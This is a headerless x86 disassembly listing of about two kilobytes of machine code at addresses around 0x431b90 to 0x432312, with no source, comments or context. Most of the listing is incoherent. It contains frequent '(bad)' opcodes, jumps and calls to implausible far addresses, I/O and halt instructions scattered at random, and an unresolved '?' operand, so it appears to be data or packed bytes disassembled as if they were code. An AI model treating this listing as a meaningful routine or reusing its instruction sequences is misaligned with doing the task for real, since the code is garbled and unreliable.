  431b90:	jb     0x431bcd
  431b92:	add    BYTE PTR [edi],cl
  431b94:	inc    ebp
  431b95:	imul   eax,edi,0x858bd800
  431b9b:	cld    
  431b9c:	clc    
  431b9d:	mov    DWORD PTR [ebp+0x0],eax
  431ba0:	inc    DWORD PTR [eax]
  431ba2:	or     al,0xde
  431ba4:	sbb    bh,0x1
  431ba7:	retf   
  431ba8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431baf:	dec    ebp
  431bb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431bb6:	enter  0x12de,0xdf
  431bba:	inc    ebp
  431bbb:	pop    ebp
  431bbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431bc2:	add    DWORD PTR [edx],edx
  431bc4:	add    BYTE PTR [ebp+0x50],dl
  431bc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431bcd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431bd3:	or     ah,al
  431bd5:	pop    ss
  431bd6:	cdq    
  431bd7:	push   ebp
  431bd8:	clc    
  431bd9:	mov    eax,DWORD PTR [ebp-0x4]
  431bdc:	xor    edx,edx
  431bde:	add    esi,DWORD PTR [ebx]
  431be0:	cmp    eax,DWORD PTR [ebx]
  431be2:	hlt    
  431be3:	cmp    DWORD PTR [ebx],esp
  431be5:	or     al,BYTE PTR [ebp+0xf]
  431be8:	mov    eax,DWORD PTR [edx]
  431bea:	loopne 0x431bec
  431bec:	(bad)  
  431bed:	mov    ecx,esi
  431bef:	cld    
  431bf0:	pushf  
  431bf1:	pop    ebp
  431bf2:	fwait
  431bf3:	mov    esi,DWORD PTR [edx]
  431bf5:	lock mov eax,eax
  431bf8:	adc    BYTE PTR [ebx],al
  431bfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c07:	dec    ebp
  431c08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c0e:	(bad)  
  431c0f:	iret   
  431c10:	inc    ebp
  431c11:	(bad)  
  431c12:	jne    0x431c61
  431c14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c1a:	(bad)  
  431c1b:	cmp    ebx,eax
  431c1d:	je     0x431ba5
  431c1f:	add    edi,edi
  431c21:	or     bh,bh
  431c23:	dec    ebp
  431c24:	inc    ebp
  431c25:	mov    esi,DWORD PTR [ebx]
  431c27:	cld    
  431c28:	add    ecx,esi
  431c2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431c2d:	mov    edx,DWORD PTR [edi]
  431c2f:	or     BYTE PTR [ebp-0x7c],al
  431c32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431c38:	test   BYTE PTR [ebx+ebx*4],cl
  431c3b:	inc    ebp
  431c3c:	xor    bh,BYTE PTR [esi]
  431c3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c45:	jne    0x431c0e
  431c47:	mov    ebp,esp
  431c49:	fcomp  DWORD PTR [ebx]
  431c4b:	add    BYTE PTR [ecx],al
  431c4d:	inc    DWORD PTR [ebp-0x75]
  431c50:	(bad)  
  431c51:	cld    
  431c52:	add    al,0xce
  431c54:	mov    ecx,edi
  431c56:	cld    
  431c57:	inc    ebp
  431c58:	fidivr WORD PTR [ebx]
  431c5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431c5d:	mov    eax,DWORD PTR [eax]
  431c5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c65:	fadd   st,st(7)
  431c67:	add    BYTE PTR [ebp-0x1],al
  431c6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431c6d:	inc    ebp
  431c6e:	mov    bh,0xc7
  431c71:	loopne 0x431cb8
  431c73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c79:	sbb    dh,BYTE PTR [ebx]
  431c7b:	pushf  
  431c7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c82:	mov    eax,edi
  431c84:	cwde   
  431c85:	inc    ebp
  431c86:	inc    ebp
  431c87:	jne    0x431c14
  431c89:	mov    esp,esp
  431c8b:	clc    
  431c8c:	add    al,0x4d
  431c8e:	mov    DWORD PTR [ebx],esi
  431c90:	or     al,0x33
  431c92:	inc    ebp
  431c93:	lea    ecx,[ebx-0x398d13fd]
  431c99:	add    bh,al
  431c9b:	inc    ebp
  431c9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431ca3:	add    ebp,esp
  431ca5:	shufps xmm1,xmm3,0xc7
  431ca9:	(bad)  
  431caa:	jmp    0x748857d3
  431caf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431cb5:	hlt    
  431cb6:	mov    ecx,DWORD PTR [edi]
  431cb8:	fadd   DWORD PTR [ebp+0x0]
  431cbb:	xor    ecx,DWORD PTR [edi]
  431cbd:	add    ecx,ecx
  431cbf:	cmp    edi,edi
  431cc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431cc5:	(bad)  
  431cc6:	jmp    0x431c53
  431cc8:	mov    edi,esp
  431cca:	or     al,0xc6
  431ccc:	inc    ebp
  431ccd:	(bad)  
  431cce:	mov    eax,DWORD PTR [ebp+0x10]
  431cd1:	jne    0x431c5c
  431cd3:	mov    eax,DWORD PTR [ecx]
  431cd5:	clc    
  431cd6:	add    BYTE PTR [ebp-0x40],cl
  431cd9:	xor    edx,DWORD PTR [eax-0x73]
  431cdc:	jne    0x431cdf
  431cde:	push   DWORD PTR [edx+0x8]
  431ce1:	add    BYTE PTR [ebp+0x45],al
  431ce4:	mov    ebp,ecx
  431ce6:	cld    
  431ce7:	add    BYTE PTR [ebp+0x0],cl
  431cea:	xor    eax,DWORD PTR [ebp+0x3]
  431ced:	mov    DWORD PTR [ebx],edi
  431cef:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cf5:	sub    eax,0x5d330e4d
  431cfa:	lea    esi,[ebx]
  431cfc:	add    DWORD PTR [ebx],eax
  431cfe:	jb     0x431ce9
  431d00:	add    BYTE PTR [eax],al
  431d02:	inc    ebp
  431d03:	add    bl,ch
  431d05:	inc    ebp
  431d06:	mov    esi,DWORD PTR [ebx]
  431d08:	or     al,0x3
  431d0a:	(bad)  
  431d0b:	mov    edi,eax
  431d0d:	in     al,dx
  431d0e:	scas   eax,DWORD PTR es:[edi]
  431d0f:	inc    ebp
  431d10:	mov    esi,DWORD PTR [ebx]
  431d12:	in     al,0x3
  431d14:	add    al,0x89
  431d16:	mov    ecx,DWORD PTR [eax+edi*8]
  431d19:	dec    ebp
  431d1a:	(bad)  
  431d1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431d22:	mov    ecx,eax
  431d24:	cld    
  431d25:	push   es
  431d26:	dec    ebp
  431d27:	add    al,0x33
  431d29:	mov    DWORD PTR [ebx],eax
  431d2b:	in     al,dx
  431d2c:	cmp    DWORD PTR [ebp-0x67],eax
  431d2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431d35:	mov    edx,DWORD PTR [ebp-0x4]
  431d38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431d3b:	xor    eax,DWORD PTR [ebp+0x3]
  431d3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431d44:	xor    edi,esp
  431d46:	jmp    0xff771a98
  431d4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431d4e:	xor    ebx,DWORD PTR [edi]
  431d50:	add    eax,ecx
  431d52:	cmp    ebx,DWORD PTR [eax]
  431d54:	mov    ecx,DWORD PTR [ebp-0x4]
  431d57:	mov    ecx,DWORD PTR [eax]
  431d59:	adc    BYTE PTR [ebp-0x80],al
  431d5c:	jmp    0x431d5f
  431d5e:	mov    eax,DWORD PTR [eax]
  431d60:	cld    
  431d61:	mov    bh,0xc6
  431d63:	push   ecx
  431d64:	(bad)  
  431d65:	jne    0x431dc5
  431d67:	dec    ecx
  431d69:	or     BYTE PTR [ecx+ebx*1],cl
  431d6c:	push   ebp
  431d6d:	inc    ebp
  431d6e:	in     al,dx
  431d6f:	add    ebp,esp
  431d71:	or     bh,al
  431d73:	dec    ebp
  431d74:	cld    
  431d75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d7b:	xor    DWORD PTR [edx],0x2
  431d7e:	pushf  
  431d7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431d85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d8b:	mov    edx,DWORD PTR [ecx+0xc]
  431d8e:	xor    eax,esi
  431d90:	mov    edx,0xc172c7
  431d95:	inc    ebp
  431d96:	mov    esi,DWORD PTR [ebp+0x8]
  431d99:	mov    eax,edx
  431d9b:	call   0x84c7e490
  431da0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431da6:	mov    ebp,eax
  431da8:	or     BYTE PTR [eax],dl
  431daa:	jo     0x431df9
  431dac:	push   edi
  431dad:	xor    esi,DWORD PTR [ebp+0x3]
  431db0:	(bad)  
  431db1:	pmulhuw mm0,mm1
  431db4:	test   DWORD PTR [ebp-0x8],ecx
  431db7:	mov    DWORD PTR [ebp-0x67],eax
  431dba:	mov    eax,DWORD PTR [ebp-0x4]
  431dbd:	xor    edi,DWORD PTR [ebp-0x73]
  431dc0:	xor    eax,DWORD PTR [ebx]
  431dc2:	xor    esi,DWORD PTR [edx+0x3]
  431dc5:	add    BYTE PTR [ecx],bh
  431dc7:	inc    ebp
  431dc8:	(bad)  
  431dc9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431dcf:	mov    DWORD PTR [eax],0x750f0004
  431dd5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431ddb:	lock add BYTE PTR [ebp+0x0],cl
  431ddf:	mov    esi,DWORD PTR [ebp-0x18]
  431de2:	mov    ebp,edx
  431de4:	or     al,0x72
  431de6:	ja     0x431de8
  431de8:	mov    edx,esi
  431dea:	cld    
  431deb:	(bad)  
  431dee:	cli    
  431def:	mov    esi,DWORD PTR [ebp-0x4]
  431df2:	cmp    ecx,esi
  431df4:	bswap  edi
  431df6:	(bad)
  431dfa:	mov    esi,DWORD PTR [ebp-0x4]
  431dfd:	mov    esi,ecx
  431dff:	clc    
  431e00:	repnz add esi,DWORD PTR [ebp+0x45]
  431e04:	push   ebx
  431e05:	xor    eax,DWORD PTR [ebp+0x3]
  431e08:	cmp    al,0x5f
  431e0a:	pushf  
  431e0b:	pop    ebx
  431e0c:	jmp    0x431ed3
  431e11:	mov    esi,DWORD PTR [ebp-0x7d]
  431e14:	xor    ebp,DWORD PTR [eax]
  431e16:	lea    eax,[ebp-0x8]
  431e19:	xor    edx,esi
  431e1b:	pushf  
  431e1c:	out    dx,eax
  431e1d:	(bad)  
  431e1e:	neg    eax
  431e20:	ins    DWORD PTR es:[edi],dx
  431e21:	test   esi,edi
  431e23:	clc    
  431e24:	pop    esp
  431e25:	inc    ebp
  431e26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431e2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431e32:	add    cl,al
  431e34:	jne    0x431dd1
  431e36:	mov    esi,DWORD PTR [edx]
  431e38:	in     al,dx
  431e39:	push   esi
  431e3a:	xor    BYTE PTR [ebp-0xe],dh
  431e3d:	add    edi,esi
  431e3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e45:	add    cl,bh
  431e47:	mov    edi,DWORD PTR [ebp+0x8]
  431e4a:	mov    DWORD PTR [ebp-0x14],esi
  431e4d:	add    esi,DWORD PTR [ebp+0x3c]
  431e50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e56:	mov    ah,0x3e
  431e58:	fwait
  431e59:	pushf  
  431e5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431e60:	jne    0x431ded
  431e62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431e65:	icebp  
  431e66:	icebp  
  431e67:	shl    edx,0xf2
  431e6a:	(bad)  
  431e6b:	mov    ah,0x16
  431e6d:	push   eax
  431e6e:	jne    0x431e03
  431e70:	mov    ecx,DWORD PTR [edi]
  431e72:	in     al,dx
  431e73:	jmp    0x431e66
  431e75:	add    dl,dh
  431e77:	mov    edi,esi
  431e79:	or     al,0x8
  431e7b:	inc    ebp
  431e7c:	jne    0x431e81
  431e7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e84:	ret    
  431e85:	or     bh,bh
  431e87:	jge    0x431e71
  431e89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e8f:	xor    edi,eax
  431e91:	add    esi,DWORD PTR [ebp-0x77]
  431e94:	mov    ebx,esp
  431e96:	clc    
  431e97:	neg    DWORD PTR [ebp-0x7c]
  431e9a:	xor    eax,DWORD PTR [eax]
  431e9c:	cmp    eax,DWORD PTR [eax]
  431e9e:	repz jne 0x431e36
  431ea1:	xor    eax,DWORD PTR [ecx]
  431ea3:	add    ebx,DWORD PTR [eax]
  431ea5:	mov    DWORD PTR [ebp-0x8],eax
  431ea8:	mov    eax,edi
  431eaa:	cld    
  431eab:	lock pop eax
  431ead:	test   DWORD PTR [ebx],esi
  431eaf:	clc    
  431eb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431eb6:	fdivp  st(4),st
  431eb8:	test   ecx,esi
  431eba:	(bad)  
  431ebb:	jnp    0x431ebc
  431ebd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431ec3:	jae    0x431e50
  431ec5:	sub    edi,esp
  431ec7:	(bad)  
  431ec8:	shl    DWORD PTR [eax-0x3e],0x89
  431ecc:	leave  
  431ecd:	call   0x8198d5da
  431ed2:	in     al,dx
  431ed3:	(bad)  
  431ed4:	in     al,dx
  431ed5:	add    bh,al
  431ed7:	mov    esp,edi
  431ed9:	in     al,dx
  431eda:	test   DWORD PTR [ebp-0x8],edi
  431edd:	mov    eax,DWORD PTR [ebp+0x2b]
  431ee0:	xor    al,BYTE PTR [ebx]
  431ee2:	pushf  
  431ee3:	jnp    0x57321b1c
  431ee9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431eed:	loopne 0x431f22
  431eef:	jne    0x431eac
  431ef1:	mov    esi,DWORD PTR [edx-0x20]
  431ef4:	add    BYTE PTR [ebp-0x3d],bh
  431ef7:	xor    eax,DWORD PTR [ebp-0x73]
  431efa:	mov    edi,DWORD PTR [esi]
  431efc:	cld    
  431efd:	jb     0x431ec5
  431eff:	add    bl,al
  431f01:	jne    0x431f48
  431f03:	mov    edx,DWORD PTR [edi-0x10]
  431f06:	jge    0x431f85
  431f08:	mov    esi,DWORD PTR [ebx]
  431f0a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f0e:	xor    esi,DWORD PTR [ebp-0x77]
  431f11:	mov    esi,eax
  431f13:	lock inc ebp
  431f15:	jge    0x431f48
  431f17:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f1e:	dec    ebp
  431f1f:	mov    esi,DWORD PTR [ebx]
  431f21:	loopne 0x431eac
  431f23:	jge    0x431f1d
  431f25:	add    DWORD PTR [ebp-0x7d],eax
  431f28:	icebp  
  431f29:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431f30:	dec    ebp
  431f31:	hlt    
  431f32:	xor    ebx,DWORD PTR [ebp-0x77]
  431f35:	mov    esi,esp
  431f37:	in     al,0x45
  431f39:	jge    0x431f78
  431f3b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f42:	dec    ebp
  431f43:	push   esp
  431f44:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f4a:	inc    ebp
  431f4b:	hlt    
  431f4c:	xor    DWORD PTR [ebp-0x61],esi
  431f4f:	mov    edi,DWORD PTR [eax+0xf19504]
  431f55:	repnz mov DWORD PTR [ebp+0x20],ebx
  431f59:	cmp    eax,DWORD PTR [ebp+0xf]
  431f5c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f60:	fistp  WORD PTR [ebx+0x0]
  431f63:	inc    ebp
  431f64:	mov    ebx,DWORD PTR [edi+0xc]
  431f67:	add    eax,eax
  431f69:	inc    ebp
  431f6a:	test   BYTE PTR [ebx],dh
  431f6c:	add    eax,DWORD PTR [ebx]
  431f6e:	add    BYTE PTR [esi+0x45],bl
  431f71:	ret    0x85
  431f74:	jnp    0x5443a343
  431f7a:	inc    bp
  431f7c:	inc    ebp
  431f7d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f83:	fdiv   QWORD PTR [ebx]
  431f85:	test   DWORD PTR [ecx+0x453bf8],edi
  431f8b:	push   ebx
  431f8c:	add    edi,DWORD PTR [esi+0x708088b]
  431f92:	cmp    esi,eax
  431f94:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f9b:	mov    esp,edi
  431f9d:	call   0x33ce64ef
  431fa2:	or     BYTE PTR [ebx],al
  431fa4:	inc    ecx
  431fa5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431fab:	and    BYTE PTR [ebp-0x7074f0bb],al
  431fb1:	lock add cl,al
  431fb4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431fbb:	mov    ch,0x45
  431fbd:	clc    
  431fbe:	xor    eax,DWORD PTR [ebp+0x3]
  431fc1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431fc7:	inc    ebp
  431fc8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431fce:	mov    edi,eax
  431fd0:	mov    eax,DWORD PTR [ebp+0x3c]
  431fd3:	mov    ecx,DWORD PTR [eax]
  431fd5:	hlt    
  431fd6:	inc    ebp
  431fd7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fde:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fe4:	push   ebp
  431fe5:	mov    edi,DWORD PTR [ebx]
  431fe7:	in     al,dx
  431fe8:	jne    0x431fab
  431fea:	mov    eax,DWORD PTR [ebp-0x28]
  431fed:	add    DWORD PTR [eax],0xe8058dec
  431ff3:	clc    
  431ff4:	mov    esi,DWORD PTR [edi-0x8]
  431ff7:	add    dh,dl
  431ff9:	rol    WORD PTR [ebp-0x1],cl
  431ffd:	mov    edx,DWORD PTR [eax+0x8]
  432000:	jne    0x431fc2
  432002:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432009:	inc    ebp
  43200a:	push   esp
  43200b:	test   DWORD PTR [ecx+0xf],ecx
  43200e:	sub    edx,esp
  432010:	add    eax,DWORD PTR [eax]
  432012:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432018:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43201f:	mov    eax,DWORD PTR [ecx]
  432021:	and    BYTE PTR [eax],al
  432023:	cmp    al,0x10
  432025:	add    BYTE PTR [ebp+0x66],al
  432028:	inc    ecx
  43202a:	push   esp
  43202b:	add    dh,BYTE PTR [ebp+0x0]
  43202e:	push   edx
  43202f:	enterw 0xc1,0x4d
  432034:	mov    esp,DWORD PTR [esi+0x20]
  432037:	add    DWORD PTR [ecx-0x7b],eax
  43203a:	add    eax,DWORD PTR [ebx]
  43203c:	str    WORD PTR [eax+0x45]
  432040:	lea    ecx,[ebx+0x45890801]
  432046:	sbb    BYTE PTR [ebx],al
  432048:	dec    ebp
  432049:	cmp    al,0xf
  43204b:	inc    ebp
  43204c:	push   eax
  43204d:	mov    esi,DWORD PTR [ebx]
  43204f:	push   eax
  432050:	add    eax,eax
  432052:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432059:	inc    ebp
  43205a:	add    BYTE PTR [ecx],dh
  43205c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432063:	(bad)  
  432064:	mov    ebx,eax
  432066:	loopne 0x4320ad
  432068:	dec    ebp
  432069:	mov    ecx,DWORD PTR [edi]
  43206b:	cld    
  43206c:	push   eax
  43206d:	xchg   DWORD PTR [ebx],esi
  43206f:	add    DWORD PTR [ebx],ebp
  432071:	add    BYTE PTR [ebx],ch
  432073:	or     BYTE PTR [ecx],bh
  432075:	dec    ecx
  432076:	loopne 0x43207b
  432078:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43207e:	push   ebp
  43207f:	add    DWORD PTR [ebx+0x55100800],eax
  432085:	dec    ebp
  432086:	jmp    0x432011
  432088:	mov    esp,DWORD PTR [eax]
  43208a:	sbb    dl,dl
  43208c:	inc    eax
  43208d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432093:	add    BYTE PTR [ebx+0x74528555],cl
  432099:	push   ebp
  43209a:	div    DWORD PTR [ebx]
  43209c:	and    eax,DWORD PTR [ebx]
  43209e:	add    edx,DWORD PTR [edx-0x30]
  4320a1:	jno    0x43202e
  4320a3:	inc    DWORD PTR [eax+eiz*1]
  4320a6:	inc    ebp
  4320a7:	push   eax
  4320a8:	push   eax
  4320a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4320af:	mov    edi,esp
  4320b1:	push   eax
  4320b2:	inc    ebp
  4320b3:	enter  0x458b,0x8
  4320b7:	push   ecx
  4320b8:	(bad)  
  4320b9:	call   0x10d2a91
  4320be:	pop    ss
  4320bf:	push   ebp
  4320c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4320c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4320cc:	push   ecx
  4320cd:	jo     0x4320b7
  4320cf:	inc    DWORD PTR [edi]
  4320d1:	or     BYTE PTR [eax],al
  4320d3:	call   0xce281d
  4320d8:	fmul   QWORD PTR [ebp+0x55]
  4320db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320e1:	mov    bh,0x8c
  4320e3:	adc    al,0x9b
  4320e5:	dec    esp
  4320e6:	xor    bl,BYTE PTR [eax]
  4320e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4320eb:	mov    eax,DWORD PTR [ebp-0x4]
  4320ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320f4:	push   es
  4320f5:	retf   
  4320f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4320fa:	inc    ebp
  4320fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432102:	retf   0x83fc
  432105:	into   
  432106:	dec    ebp
  432107:	retf   
  432108:	mov    ecx,DWORD PTR [ebp-0x74]
  43210b:	mov    eax,DWORD PTR [eax]
  43210d:	fdiv   QWORD PTR [ebx]
  43210f:	mov    bh,0x3
  432111:	push   es
  432112:	mov    esi,ecx
  432114:	sbb    cl,dl
  432116:	dec    ebp
  432117:	sar    DWORD PTR [ebx],cl
  432119:	push   ebp
  43211a:	jne    0x43212b
  43211c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432122:	lea    ebx,[eax]
  432124:	call   0xf4ccaceb
  432129:	sbb    dh,dl
  43212b:	add    edx,ebx
  43212d:	push   ebp
  43212e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432134:	push   ecx
  432135:	mov    DWORD PTR [eax-0x30],edx
  432138:	test   DWORD PTR [edx],eax
  43213a:	xadd   esp,esi
  43213d:	pop    es
  43213e:	add    cl,dl
  432140:	mov    eax,ecx
  432142:	or     al,0x45
  432144:	(bad)  
  432145:	push   eax
  432146:	add    DWORD PTR [edx+0x0],eax
  432149:	add    ecx,DWORD PTR [ecx]
  43214b:	and    dh,cl
  43214d:	call   0xc72a1d
  432152:	add    DWORD PTR [ebp+0x0],edx
  432155:	mov    esp,DWORD PTR [ebp+0x18]
  432158:	add    BYTE PTR [eax+0x50],cl
  43215b:	xor    eax,DWORD PTR [eax]
  43215d:	add    esp,DWORD PTR [esi+0x3b]
  432160:	inc    ebp
  432161:	je     0x4320e6
  432163:	push   ecx
  432164:	dec    BYTE PTR [ebp-0x77]
  432167:	add    eax,esi
  432169:	or     al,0x5e
  43216b:	inc    eax
  43216c:	add    BYTE PTR [ebx],al
  43216e:	data16 and BYTE PTR [ebp+0x50],al
  432172:	sub    DWORD PTR [ecx],0xfffffff8
  432175:	add    BYTE PTR [ebp-0x75],ah
  432178:	add    BYTE PTR [eax],bl
  43217a:	enter  0x894d,0x8b
  43217e:	int3   
  43217f:	loopne 0x432143
  432181:	rol    BYTE PTR [eax],0x33
  432184:	lea    cx,[ebp+0xa]
  432188:	data16 jb 0x4321d0
  43218b:	add    BYTE PTR [ebx+0x44890855],cl
  432191:	sbb    ah,al
  432193:	inc    ebp
  432194:	cmp    al,0xf
  432196:	add    BYTE PTR [edx+0x66],dl
  432199:	xor    ecx,DWORD PTR [eax]
  43219b:	sub    eax,DWORD PTR [edx]
  43219d:	mov    eax,DWORD PTR [eax]
  43219f:	or     al,0x66
  4321a1:	ror    edx,cl
  4321a3:	dec    ebp
  4321a4:	inc    ebp
  4321a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4321ab:	cld    
  4321ac:	or     BYTE PTR [edi+0x4501dd],dl
  4321b2:	ret    0xecce
  4321b5:	retf   
  4321b6:	(bad)  
  4321b7:	dec    ebp
  4321b8:	mov    al,0x8b
  4321ba:	loopne 0x4321dc
  4321bc:	cmp    ecx,DWORD PTR [edx]
  4321be:	inc    ebp
  4321bf:	daa    
  4321c0:	loopne 0x432149
  4321c2:	in     al,dx
  4321c3:	add    edi,eax
  4321c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4321cb:	push   ebp
  4321cc:	inc    ebp
  4321cd:	xor    ebx,edx
  4321cf:	add    ebp,esp
  4321d1:	push   edx
  4321d2:	push   bp
  4321d4:	inc    ebp
  4321d5:	(bad)  
  4321d6:	in     eax,dx
  4321d7:	push   esp
  4321d8:	(bad)  
  4321d9:	inc    edx
  4321db:	sbb    al,0x33
  4321dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321e4:	add    BYTE PTR [ebp+0x46],0x8b
  4321e8:	jmp    0xf98b:0x100041c8
  4321ef:	xor    esi,DWORD PTR [edx+0x3]
  4321f2:	mov    ecx,DWORD PTR [edi]
  4321f4:	fmul   DWORD PTR [edx]
  4321f6:	add    BYTE PTR [eax],al
  4321f8:	lea    eax,[ebx-0x4700273c]
  4321fe:	add    al,0x4f
  432200:	pop    DWORD PTR [eax]
  432202:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432208:	push   edx
  432209:	inc    WORD PTR [ebp+0x8]
  43220d:	mov    eax,0x514f4d
  432212:	(bad)
  432216:	add    al,al
  432218:	xor    DWORD PTR [ebx-0x74baf730],eax
  43221e:	test   DWORD PTR [esi+0x74],esp
  432221:	inc    ebp
  432222:	mov    DWORD PTR [eax+0xa4e08],edi
  432228:	add    BYTE PTR [ecx-0x76c435bb],cl
  43222e:	or     dh,cl
  432230:	or     eax,0x8b8d5045
  432235:	inc    ebp
  432236:	mov    WORD PTR [ecx+0x3b8a00],?
  43223c:	jne    0x432271
  43223e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432244:	add    DWORD PTR [ebx],eax
  432246:	add    bh,bh
  432248:	adc    DWORD PTR [eax],ecx
  43224a:	adc    DWORD PTR [ebp+0x55],edi
  43224d:	push   es
  43224e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432254:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43225b:	inc    ebp
  43225c:	mov    esp,edi
  43225e:	or     al,0xda
  432260:	push   eax
  432261:	(bad)  
  432262:	jne    0x432218
  432264:	call   0x3b1b53
  432269:	inc    ebp
  43226a:	sar    BYTE PTR [eax],0x84
  43226d:	in     al,dx
  43226e:	add    bh,al
  432270:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432277:	(bad)  
  432278:	and    al,al
  43227a:	fs in  eax,dx
  43227c:	inc    DWORD PTR [ebp-0x7b]
  43227f:	jle    0x432290
  432281:	leave  
  432282:	scas   al,BYTE PTR es:[edi]
  432283:	inc    esp
  432284:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43228b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432292:	call   DWORD PTR [edi]
  432294:	shr    ah,0x84
  432297:	xchg   DWORD PTR [eax],eax
  432299:	add    DWORD PTR [eax],eax
  43229b:	add    bh,bh
  43229d:	dec    ebp
  43229e:	and    BYTE PTR [ecx-0x38],dl
  4322a1:	push   eax
  4322a2:	dec    DWORD PTR [ebx+0xfd885]
  4322a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4322ae:	mov    WORD PTR [ecx+0x0],ss
  4322b1:	lea    ecx,[ebx+0x108b20d8]
  4322b7:	mov    WORD PTR [edx],ds
  4322b9:	add    BYTE PTR [edi+0xff01ff],al
  4322bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4322c2:	push   ecx
  4322c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4322c7:	inc    ebp
  4322c8:	in     al,0xeb
  4322ca:	jno    0x432257
  4322cc:	push   edx
  4322cd:	mov    DWORD PTR [eax-0x28],edx
  4322d0:	mov    eax,DWORD PTR [ebp+0x20]
  4322d3:	je     0x43225c
  4322d5:	mov    eax,DWORD PTR [ecx]
  4322d7:	sbb    BYTE PTR [eax],al
  4322d9:	pop    DWORD PTR [eax]
  4322db:	add    esi,eax
  4322dd:	add    bl,al
  4322df:	adc    DWORD PTR [edi],esi
  4322e1:	jmp    0x8bce7333
  4322e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4322ed:	jne    0x43227a
  4322ef:	mov    ecx,DWORD PTR [eax]
  4322f1:	in     al,0x75
  4322f3:	pop    DWORD PTR [ecx+0x5401]
  4322f9:	push   edx
  4322fa:	inc    DWORD PTR [ebx]
  4322fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432302:	add    BYTE PTR [edi+0x9],dl
  432305:	call   DWORD PTR [esi]
  432307:	and    dl,al
  432309:	and    bh,bh
  43230b:	inc    edi
  43230d:	test   eax,edx
  43230f:	sldt   ebx
  432312:	xor    al,BYTE PTR [eax]
